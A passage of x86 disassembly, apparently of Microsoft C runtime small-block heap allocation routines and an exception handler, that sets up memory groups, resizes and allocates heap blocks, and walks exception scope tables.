  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
